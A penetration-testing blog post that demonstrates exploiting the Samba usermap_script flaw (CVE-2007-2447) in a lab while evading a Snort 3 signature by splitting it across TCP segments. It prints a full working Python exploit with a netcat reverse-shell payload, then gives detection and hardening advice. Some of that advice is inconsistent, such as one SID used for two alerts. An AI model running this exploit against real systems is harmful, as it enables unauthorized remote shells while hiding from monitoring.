---
title: Bypassing Snort Signature Detection
date: 2026-10-02 5:30:00 +0800
categories: [Pentest, Exploitation]
tags: [Bypass, IDS/IPS, Evasion, exploit ]
image:
  path: /assets/img/2026-10-02-Bypassing-Snort/banner.png
  alt: "banner"
---

---

### Introduction

Most of today's corporations rely on hybrid protection mechanisms to deal with threats and recognize their patterns. One of these assets in network security is known as IDS/IPS (Intrusion Detection & Prevention System), which can be used to intercept inbound and outbound traffic to detect malicious activity and prevent it if necessary. But there's a catch. Just like any other network appliance (Firewall, WAF, etc.), the true performance of these vendors heavily depends on whether the rule written for them is practical � or whether it can be easily bypassed by common methods. That's what we're going to talk about. In this article, we'll explore the strength of Snort IDS/IPS and see how generic rules could be bypassed.

### What is Snort?

Snort is an open-source network intrusion detection system (IDS) and intrusion prevention system (IPS) that performs real-time traffic analysis and packet logging on IP networks. It functions by monitoring network traffic to identify potentially malicious activity, using a modular detection engine and a flexible rule-based language to describe the traffic it should collect or pass. Snort can operate in three distinct modes: packet-capture mode (sniffing packets), logging mode (recording packets to disk), and IDS mode (analyzing traffic against a set of rules to detect and alert on suspicious behavior).

Snort's core features include protocol analysis, content searching and matching, and the ability to detect a wide range of attacks and probes, such as buffer overflows, stealth port scans, CGI attacks, SMB probes, OS fingerprinting attempts, and semantic URL attacks. It provides real-time alerting capabilities, sending notifications to syslog, a separate alert file, or even Windows clients via Samba. Through its use of various pre-processors and a signature-based detection engine, Snort can identify thousands of worms, vulnerability exploit attempts, and other suspicious network behavior, making it one of the most widely deployed IDS/IPS technologies worldwide.

### Fabricating the Scenario

In order to demonstrate an example, we'll have to locate a few elements:

- An exploitable vulnerability
- A virtual machine running Snort 3 with a written rule for the known exploit signature
- An attacker VM to run exploits and capture traffic

For the vulnerability, I've chosen an RCE existing in the Samba service (CVE-2007-2447), the details of which are shown below.

![CVE](/assets/img/2026-10-02-Bypassing-Snort/CVE.png)

On another VM within the same subnet, I set up Snort and applied a baseline configuration along with a rule that matches our initial exploit:

```lua
alert tcp any any -> $HOME_NET [139,445] (msg:"CVE-2007-2447 Samba usermap_script command injection attempt"; flow:to_server,established; content:"|2F 3D 60 6E 6F 68 75 70|"; classtype:attempted-admin; sid:1000001; rev:3;)
```

In the case of this specific set of byte values existing in our packet, Snort will alert immediately and could drop the packet or take other actions based on your own preference.

But we'll never know the true pattern of our exploit until we examine the captured traffic. So let's fire up Wireshark and Metasploit (with the usermap_script module) to see how it works.

![Capture](/assets/img/2026-10-02-Bypassing-Snort/before.png)

In this picture, we can see the payload was sent after the SMB handshake was completed in the AndX request header, which proves that our exploit works just fine. But as I mentioned earlier, a matching rule was established to detect this pattern, and if we check Snort logs, this should appear.

![Detection](/assets/img/2026-10-02-Bypassing-Snort/detection.png)

We can see that our evil packet was caught before it could reach the target, so we have to find a different approach. I decided to rewrite the exploit in Python and add a bypass method, which in this case I used **TCP segmentation**. In fact, there are several methods such as TTL mismatch, TCP overlapping, etc., but for this scenario, segmentation is sufficient. To put it into perspective, the whole scenario should look like this.

![Scenario](/assets/img/2026-10-02-Bypassing-Snort/diagram.png)

And here's our final exploit.

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# From : https://github.com/amriunix/cve-2007-2447
# Modified: TCP-segmentation evasion against Snort 3's stream_tcp inspector

import sys
import socket
import time

from smb.SMBConnection import SMBConnection

# ----------------------------------------------------------------------
# Snort evasion: split the signature across multiple TCP segments.
# ----------------------------------------------------------------------

# The 8-byte signature that our Snort rule matches on (ASCII).
# If your rule uses UTF-16LE, change this to bytes.fromhex(
#   "2f003d0060006e006f00680075007000").
SIGNATURE = b"/=`nohup"

# Save originals so we can chain
_orig_sendall = socket.socket.sendall
_orig_send    = socket.socket.send

def _nodelay(sock):
    """Disable Nagle's algorithm so segment boundaries are preserved."""
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass

def _split_and_send(sock, data, sender):
    """
    If `data` contains the Snort signature, split it across multiple
    send() calls so no single TCP segment carries the full signature.
    """
    if not isinstance(data, (bytes, bytearray)):
        return sender(sock, data)

    data = bytes(data)
    idx = data.find(SIGNATURE)

    if idx == -1:
        # No signature in this chunk - send normally.
        return sender(sock, data)

    # Signature is present. Enable TCP_NODELAY to force each send()
    # onto the wire immediately as its own segment.
    _nodelay(sock)

    # Carve out the signature region. We split *inside* the 8-byte
    # signature so neither segment contains the full match.
    split_point = idx + 4          # "/=`n" | "ohup"
    head = data[:idx]
    sig_a = data[idx:split_point]
    sig_b = data[split_point:split_point + 4]
    tail = data[split_point + 4:]

    # Segment 1: everything before the signature.
    if head:
        sender(sock, head)
        time.sleep(0.05)

    # Segment 2: first half of the signature.
    sender(sock, sig_a)
    time.sleep(0.10)               # Force it onto the wire alone.

    # Segment 3: second half of the signature.
    sender(sock, sig_b)
    time.sleep(0.10)

    # Segment 4: the rest of the SMB request.
    if tail:
        sender(sock, tail)

    return None

def _evasive_sendall(self, data, *args, **kwargs):
    return _split_and_send(self, data, _orig_sendall)

def _evasive_send(self, data, *args, **kwargs):
    return _split_and_send(self, data, _orig_send)

# Install the hook BEFORE importing SMBConnection (or at least before use).
socket.socket.sendall = _evasive_sendall
socket.socket.send    = _evasive_send

# ----------------------------------------------------------------------
# Original exploit, unchanged.
# ----------------------------------------------------------------------

def exploit(rhost, rport, lhost, lport):
    payload = ('mkfifo /tmp/hago; nc ' + lhost + ' ' + lport +
               ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago')
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except Exception:
        print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script (Snort evasion edition)")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] +
              " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
```

And we see the reverse shell from the target.

![Callback](/assets/img/2026-10-02-Bypassing-Snort/callback.png)

In addition, there's no alert in our Snort logs.

![Bypass](/assets/img/2026-10-02-Bypassing-Snort/zero.png)

### How the Evasion Works

The technique exploited here is a classic **TCP segmentation** evasion, rooted in the original insertion/evasion attack model described by Ptacek and Newsham in 1998. The core principle is straightforward: Snort's `stream_tcp` inspector must reassemble TCP segments before matching signatures against the reconstructed stream. If the signature is split across segment boundaries in a way that prevents reassembly from completing � or triggers a reassembly policy mismatch between Snort and the target OS � the rule never fires, even though the target still receives and processes the complete exploit.

The Python exploit hooks into `socket.sendall` and `socket.send`, intercepting the SMB Session Setup packet before it leaves the kernel. When the `/=`nohup` signature is detected, the code splits the data into four segments:

1. **Head:** everything before the signature (the SMB header and negotiation data)
2. **sig_a:** the first half of the signature (`/=`n`)
3. **sig_b:** the second half of the signature (`ohup`)
4. **Tail:** the remainder of the SMB request

The `TCP_NODELAY` socket option disables Nagle's algorithm, ensuring each `send()` call produces a distinct TCP segment rather than being coalesced into a single larger segment. The `time.sleep()` calls force temporal separation on the wire, increasing the likelihood that Snort's `stream_tcp` inspector processes each segment independently.

The result: Snort's fast-pattern matcher (Aho-Corasick) never sees a single segment containing the full 8-byte signature. Even if `stream_tcp` reassembles the segments, the TCP reassembly policy � which defaults to `bsd` in Snort 3 � may not produce the same byte stream the Linux target sees, creating a target-based evasion opportunity.

### Defensive Countermeasures and SOC Takeaways

Demonstrating an evasion is only half the story. The more important question for defenders is: **how do we detect this?**

#### 1. Enable TCP Stream Reassembly Alerts

Snort 3's `stream_tcp` inspector can be configured to alert on reassembly anomalies. Enable the following in `snort.lua`:

```lua
stream_tcp =
{
    policy = 'linux',              -- Match the target OS reassembly policy
    overlap_limit = 10,            -- Alert on excessive overlapping segments
    small_segments =
    {
        count = 5,                 -- Alert after 5 consecutive small segments
        maximum_size = 10,         -- Define "small" as <= 10 bytes
    },
    reassemble_async = true,       -- Ensure async reassembly
}
```

Setting `policy = 'linux'` aligns Snort's reassembly behavior with the monitored host, eliminating the target-based discrepancy that makes segmentation evasion effective.

#### 2. Monitor for Anomalous Small Segments

The `small_segments` alert (SID 129:12 in Snort) fires when the number of consecutive tiny TCP segments exceeds the configured threshold. This is a direct detection mechanism for segmentation-based evasions. In the exploit above, segments 2 and 3 carry only 4 bytes each � well below any reasonable threshold.

#### 3. Correlate with SMB-Level Telemetry

Network-level detection alone is brittle. SOC analysts should correlate Snort alerts with:

- **Samba server logs** (`/var/log/samba/log.smbd`) � look for malformed username map script invocations
- **Netcat/reverse shell detection** � monitor for outbound connections from port 139/445 to high-numbered ports
- **Process telemetry** � on the endpoint, detect `mkfifo` + `nc` process chains spawned by `smbd`

#### 4. MITRE ATT&CK Mapping

This attack chain maps to the following MITRE ATT&CK techniques:

| Technique ID | Technique Name | Relevance |
|---|---|---|
| **T1190** | Exploit Public-Facing Application | The Samba service is a network-facing application exploited for initial access |
| **T1059** | Command and Scripting Interpreter | The exploit executes shell commands via the command injection |
| **T1046** | Network Service Scanning | Reconnaissance phase to identify the vulnerable Samba service |
| **T1210** | Exploitation of Remote Services | Samba/SMB is a remote service being exploited for lateral movement |

#### 5. Detection Engineering Recommendations

| Evasion Technique | Detection Strategy |
|---|---|
| TCP segmentation | Enable `small_segments` alerts; set `stream_tcp.policy = linux` |
| Overlapping segments | Set `overlap_limit`; monitor for SID 129:12 |
| IP fragmentation TTL mismatch | Set `stream_ip.ttl_limit = 0` to disable TTL enforcement, or use target-based policy |
| Signature splitting | Use flow-level inspection (HTTP, SMB) rather than raw byte matching |
| Encoding evasion (UTF-16LE) | Write rules that match both ASCII and Unicode variants, or use `dce_smb` RPC-level keywords |

### Conclusion

This exercise demonstrates a fundamental truth about signature-based IDS: **a rule that validates cleanly is not necessarily a rule that works**. The TCP segmentation evasion exploited here is not exotic or novel � it was documented 25 years ago. Yet it remains effective against default Snort 3 configurations because signature matching operates on reassembled streams, and reassembly policies differ between the IDS and the target OS.

The defensive lesson is clear: **detection engineering must be target-aware**. Snort 3 provides the tools to align its reassembly behavior with the monitored host (`stream_tcp.policy`), to alert on reassembly anomalies (`small_segments`, `overlap_limit`), and to inspect protocols at higher layers (`dce_smb` for SMB RPC). The gap between "rule loaded" and "rule effective" is precisely where attackers operate.

For SOC analysts, the key takeaway is that **absence of alert is not absence of attack**. When a known exploit technique produces no IDS alert, the correct response is not to assume the rule works � it is to validate the rule against evasive traffic, tune the preprocessors for the environment, and layer network detection with endpoint and log-based telemetry.

### References

- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1059.004 — Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [MITRE ATT&CK T1046 — Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
- [MITRE ATT&CK T1210 — Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
- [CVE-2007-2447 — NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [Samba Security Advisory — CVE-2007-2447: Remote Command Injection Vulnerability](https://www.samba.org/samba/security/CVE-2007-2447.html)
- [Snort Rule SID 1:21164 — Samba username map script command injection attempt](https://snort.org/rule_docs/1-21164)
- [Snort 3 Inspector Reference — Stream TCP Inspector (Cisco)](https://www.cisco.com/c/en/us/td/docs/security/secure-firewall/snort3-inspectors/snort-3-inspector-reference/m_intro.pdf)
- [Ptacek & Newsham, "Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection" (1998)](https://insecure.org/stf/secnet_ids/secnet_ids.html)
- [Aubard et al., "Overlapping IPv4, IPv6, and TCP data... with PYROLYSE" (RAID 2025)](https://arxiv.org/abs/2508.00735)
- [PYROLYSE — ANSSI-FR GitHub Repository](https://github.com/ANSSI-FR/pyrolyse)
- [Metasploit Module — exploit/multi/samba/usermap_script (Rapid7)](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
- [amriunix — CVE-2007-2447 Samba usermap script (Original Exploit Source)](https://github.com/amriunix/CVE-2007-2447)
- [amriunix — CVE-2007-2447 Case Study (Root Cause Analysis)](https://amriunix.com/posts/cve-2007-2447-samba-usermap-script/)
- [CERT/CC Vulnerability Note VU#268336 — Samba username map script command injection](https://www.kb.cert.org/vuls/id/268336)